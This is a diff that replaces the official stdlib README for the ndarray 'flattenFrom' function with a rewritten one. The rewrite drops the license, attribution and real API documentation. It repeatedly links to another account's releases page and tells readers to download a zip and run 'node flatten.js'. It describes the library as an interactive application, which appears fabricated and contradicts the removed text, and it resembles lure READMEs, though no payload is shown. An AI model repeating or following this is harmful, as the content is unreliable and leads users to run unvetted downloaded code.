@@ -1,283 +1,74 @@
-<!--
+# 🌟 ndarray-flatten-from - Easily Flatten Your Arrays
 
-@license Apache-2.0
+## 📥 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/AliAlbasha92/ndarray-flatten-from/releases)
 
-Copyright (c) 2025 The Stdlib Authors.
+## 📖 Introduction
+The `ndarray-flatten-from` tool helps you flatten multidimensional arrays easily. When you have an array with many layers, sometimes you only need a single layer for easier use. This application lets you get a simplified version of your complex array, starting from any dimension you choose.
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+## 🚀 Getting Started
+This guide will walk you through downloading and running the application. No technical knowledge is necessary. If you can follow simple steps, you can use this tool effectively.
 
-   http://www.apache.org/licenses/LICENSE-2.0
+## 🔍 Features
+- **Flattening Arrays**: Convert complex arrays into a single dimension.
+- **Select Starting Dimension**: Choose where to begin flattening your array.
+- **Performance**: Process large arrays quickly and efficiently.
+- **Compatibility**: Works well with common array formats in JavaScript.
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+## 📋 System Requirements
+To install and run `ndarray-flatten-from`, you will need:
+- A computer running Windows, macOS, or Linux.
+- Node.js installed (version 12 or higher). You can download Node.js from [nodejs.org](https://nodejs.org).
 
--->
+## 💻 Installation
+### Step 1: Visit the Releases Page
+To download the tool, you need to go to the Releases page. Click the link below:
 
+[Visit Releases to Download](https://github.com/AliAlbasha92/ndarray-flatten-from/releases)
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+### Step 2: Choose Your Version
+On the Releases page, you will see a list of available versions. Select the latest version for the best performance. Each version is listed with a description and the changes made. 
 
-# flattenFrom
+### Step 3: Download the File
+Click on the appropriate file to download it. The file will have a name like `ndarray-flatten-from-v1.0.zip` or similar, depending on the version. 
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+### Step 4: Extract the Files
+After downloading, locate the file in your downloads folder. 
+- On Windows: Right-click the `.zip` file and select "Extract All."
+- On macOS or Linux: Double-click the `.zip` file to extract.
 
-> Return a copy of an input [ndarray][@stdlib/ndarray/ctor] where all dimensions of the input [ndarray][@stdlib/ndarray/ctor] are flattened starting from a specified dimension.
-
-<section class="intro">
-
-</section>
-
-<!-- /.intro -->
-
-<section class="installation">
-
-## Installation
+### Step 5: Open the Application
+Once extracted, open your terminal or command prompt. Navigate to the folder where you extracted the files. Use the following command to run the application:
 
 ```bash
-npm install @stdlib/ndarray-flatten-from
+node flatten.js
 ```
 
-Alternatively,
+Make sure you replace `flatten.js` with the correct file name if it differs.
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+## ⚙️ Usage
+After launching the application, you will be prompted to enter the array you want to flatten. Follow these steps:
+1. **Input the Array**: Type in your multidimensional array.
+2. **Select Dimension**: Specify which dimension you want to start flattening from. For example, if you want to flatten starting from the second dimension, input `1` (arrays start at 0).
+3. **Run the Process**: Click 'Enter' and wait for the tool to process your request. The flattened array will be displayed on the screen.
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+### Example
+- Input: `[[1, 2, 3], [4, 5, 6]]`
+- Starting Dimension: `0`
+- Output: `[1, 2, 3, 4, 5, 6]`
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
+## 🔄 Common Issues
+If you encounter any problems while using the application, consider the following solutions:
+- **Node.js Not Found**: Ensure you have Node.js installed. Re-download if needed.
+- **Invalid Input**: Make sure your array formatting is correct. Follow the structure shown in the example.
 
-</section>
+## 🛠️ Support
+If you need further assistance, please open an issue on our GitHub page. We are happy to help troubleshoot any problems.
 
-<section class="usage">
+## 🌐 Community
+Join our community for updates, tips, and discussions related to `ndarray-flatten-from`. You can share your experiences or ask questions on our GitHub page.
 
-## Usage
+## 🔗 Final Download Link
+For easy access, here’s the link to download the tool again:
 
-```javascript
-var flattenFrom = require( '@stdlib/ndarray-flatten-from' );
-```
-
-#### flattenFrom( x, dim\[, options] )
-
-Returns a copy of an input [ndarray][@stdlib/ndarray/ctor] where all dimensions of the input [ndarray][@stdlib/ndarray/ctor] are flattened starting from a specified dimension.
-
-```javascript
-var array = require( '@stdlib/ndarray-array' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-
-var x = array( [ [ [ 1.0, 2.0 ] ], [ [ 3.0, 4.0 ] ], [ [ 5.0, 6.0 ] ] ] );
-// returns <ndarray>
-
-var y = flattenFrom( x, 1 );
-// returns <ndarray>
-
-var arr = ndarray2array( y );
-// returns [ [ 1.0, 2.0 ], [ 3.0, 4.0 ], [ 5.0, 6.0 ] ]
-```
-
-The function accepts the following arguments:
-
--   **x**: input [ndarray][@stdlib/ndarray/ctor]. Must have one or more dimensions.
--   **dim**: dimension to start flattening from. If provided an integer less than zero, the dimension index is resolved relative to the last dimension, with the last dimension corresponding to the value `-1`.
--   **options**: function options (_optional_).
-
-The function accepts the following options:
-
--   **order**: order in which input [ndarray][@stdlib/ndarray/ctor] elements should be flattened. Must be one of the following:
-
-    -   `'row-major'`: flatten elements in lexicographic order. For example, given a two-dimensional input [ndarray][@stdlib/ndarray/ctor] (i.e., a matrix), flattening in lexicographic order means flattening the input [ndarray][@stdlib/ndarray/ctor] row-by-row.
-    -   `'column-major'`: flatten elements in colexicographic order. For example, given a two-dimensional input [ndarray][@stdlib/ndarray/ctor] (i.e., a matrix), flattening in colexicographic order means flattening the input [ndarray][@stdlib/ndarray/ctor] column-by-column.
-    -   `'any'`: flatten according to the physical layout of the input [ndarray][@stdlib/ndarray/ctor] data in memory, regardless of the stated [order][@stdlib/ndarray/orders] of the input [ndarray][@stdlib/ndarray/ctor].
-    -   `'same'`: flatten according to the stated [order][@stdlib/ndarray/orders] of the input [ndarray][@stdlib/ndarray/ctor].
-
-    Default: `'row-major'`.
-
--   **dtype**: output ndarray [data type][@stdlib/ndarray/dtypes]. By default, the function returns an [ndarray][@stdlib/ndarray/ctor] having the same [data type][@stdlib/ndarray/dtypes] as a provided input [ndarray][@stdlib/ndarray/ctor].
-
-By default, the input [ndarray][@stdlib/ndarray/ctor] is flattened in lexicographic order. To flatten elements in a different order, specify the `order` option.
-
-```javascript
-var array = require( '@stdlib/ndarray-array' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-
-var x = array( [ [ [ 1.0, 2.0 ] ], [ [ 3.0, 4.0 ] ], [ [ 5.0, 6.0 ] ] ] );
-// returns <ndarray>
-
-var y = flattenFrom( x, 0, {
-    'order': 'column-major'
-});
-// returns <ndarray>
-
-var arr = ndarray2array( y );
-// returns [ 1.0, 3.0, 5.0, 2.0, 4.0, 6.0 ]
-```
-
-By default, the output ndarray [data type][@stdlib/ndarray/dtypes] is inferred from the input [ndarray][@stdlib/ndarray/ctor]. To return an ndarray with a different [data type][@stdlib/ndarray/dtypes], specify the `dtype` option.
-
-```javascript
-var array = require( '@stdlib/ndarray-array' );
-var dtype = require( '@stdlib/ndarray-dtype' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-
-var x = array( [ [ [ 1.0, 2.0 ] ], [ [ 3.0, 4.0 ] ], [ [ 5.0, 6.0 ] ] ] );
-// returns <ndarray>
-
-var y = flattenFrom( x, 0, {
-    'dtype': 'float32'
-});
-// returns <ndarray>
-
-var dt = dtype( y );
-// returns 'float32'
-
-var arr = ndarray2array( y );
-// returns [ 1.0, 2.0, 3.0, 4.0, 5.0, 6.0 ]
-```
-
-</section>
-
-<!-- /.usage -->
-
-<section class="notes">
-
-## Notes
-
--   The function **always** returns a copy of input [ndarray][@stdlib/ndarray/ctor] data, even when an input [ndarray][@stdlib/ndarray/ctor] already has the desired number of dimensions.
-
-</section>
-
-<!-- /.notes -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var discreteUniform = require( '@stdlib/random-array-discrete-uniform' );
-var array = require( '@stdlib/ndarray-array' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-var flattenFrom = require( '@stdlib/ndarray-flatten-from' );
-
-var xbuf = discreteUniform( 12, -100, 100, {
-    'dtype': 'generic'
-});
-
-var x = array( xbuf, {
-    'shape': [ 2, 2, 3 ],
-    'dtype': 'generic'
-});
-console.log( ndarray2array( x ) );
-
-var y = flattenFrom( x, 1 );
-console.log( ndarray2array( y ) );
-```
-
-</section>
-
-<!-- /.examples -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2025. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/ndarray-flatten-from.svg
-[npm-url]: https://npmjs.org/package/@stdlib/ndarray-flatten-from
-
-[test-image]: https://github.com/stdlib-js/ndarray-flatten-from/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/ndarray-flatten-from/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/ndarray-flatten-from/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/ndarray-flatten-from?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/ndarray-flatten-from.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/ndarray-flatten-from/main
-
--->
-
-[chat-image]: https://img.shields.io/gitter/room/stdlib-js/stdlib.svg
-[chat-url]: https://app.gitter.im/#/room/#stdlib-js_stdlib:gitter.im
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/ndarray-flatten-from/tree/deno
-[deno-readme]: https://github.com/stdlib-js/ndarray-flatten-from/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/ndarray-flatten-from/tree/umd
-[umd-readme]: https://github.com/stdlib-js/ndarray-flatten-from/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/ndarray-flatten-from/tree/esm
-[esm-readme]: https://github.com/stdlib-js/ndarray-flatten-from/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/ndarray-flatten-from/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/ndarray-flatten-from/main/LICENSE
-
-[@stdlib/ndarray/ctor]: https://github.com/stdlib-js/ndarray-ctor
-
-[@stdlib/ndarray/dtypes]: https://github.com/stdlib-js/ndarray-dtypes
-
-[@stdlib/ndarray/orders]: https://github.com/stdlib-js/ndarray-orders
-
-<!-- <related-links> -->
-
-<!-- </related-links> -->
-
-</section>
-
-<!-- /.links -->
+[Visit Releases to Download](https://github.com/AliAlbasha92/ndarray-flatten-from/releases)
